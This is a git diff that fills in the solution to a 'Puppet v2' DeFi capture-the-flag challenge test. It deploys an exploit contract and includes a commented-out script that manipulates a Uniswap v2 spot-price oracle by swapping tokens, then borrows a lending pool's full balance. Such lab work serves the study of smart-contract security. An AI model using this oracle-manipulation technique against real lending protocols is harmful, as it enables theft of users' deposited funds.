@@ -82,7 +82,45 @@ describe('[Challenge] Puppet v2', function () {
     });
 
     it('Execution', async function () {
-        /** CODE YOUR SOLUTION HERE */
+
+        // The idea of the code was to use an oracle, but v2 doesn't keep a history of the accumulators unlike v3
+        // Therefore the oracle still uses spot prices
+        // A difference with v1 is that the price is determined to be the one before the first interaction in a block
+
+        decimal = 1n * 10n ** 18n;;
+        playerToken = await token.connect(player);
+        playerWeth = await weth.connect(player);
+        playerRouter = await uniswapRouter.connect(player);
+        playerPool = await lendingPool.connect(player);
+
+        deadline = (await ethers.provider.getBlock('latest')).timestamp + 150;
+
+        Exploit = await (await ethers.getContractFactory('ExploitPuppetV2', player)).deploy(token.address, weth.address, lendingPool.address, uniswapRouter.address);
+        await playerToken.approve(Exploit.address, ethers.constants.MaxUint256);
+        await playerWeth.approve(Exploit.address, ethers.constants.MaxUint256);
+        await Exploit.exploit(deadline, {value: PLAYER_INITIAL_ETH_BALANCE * BigInt(99) / BigInt(100)});
+
+        // Initially writing it in JS was a mistake, don't do it...
+/*
+        // We now have enough to take over the pool
+        // Need to get some WETH with our eth balance, but further swaps will changethe amount of neededWeth
+        finalAmounts = await playerRouter.getAmountsOut(BigInt(playerBalance) * BigInt(99) / BigInt(100), [weth.address, token.address])
+        await playerRouter.swapExactETHForTokens(0, [weth.address, token.address], player.address, deadline,
+            {value: BigInt(playerBalance) * BigInt(99) / BigInt(100),  gasLimit: 1e6});
+
+        
+        playerTokBalance = await token.balanceOf(player.address);
+        ethToWETHBalance = BigInt(playerBalance) / BigInt(100) * BigInt(99);
+        await playerRouter.swapTokensForExactTokens(ethToWETHBalance, playerTokBalance, [token.address, weth.address], player.address, deadline, {gasLimit: 1e6});
+
+        // Empty pool
+        await playerWeth.approve(lendingPool.address, ethers.constants.MaxUint256);
+
+        console.log(await weth.balanceOf(player.address));
+        console.log(await token.balanceOf(player.address));
+        console.log(neededWeth);
+        console.log(await lendingPool.calculateDepositOfWETHRequired(poolBalance))
+        await playerPool.borrow(poolBalance);*/
     });
 
     after(async function () {
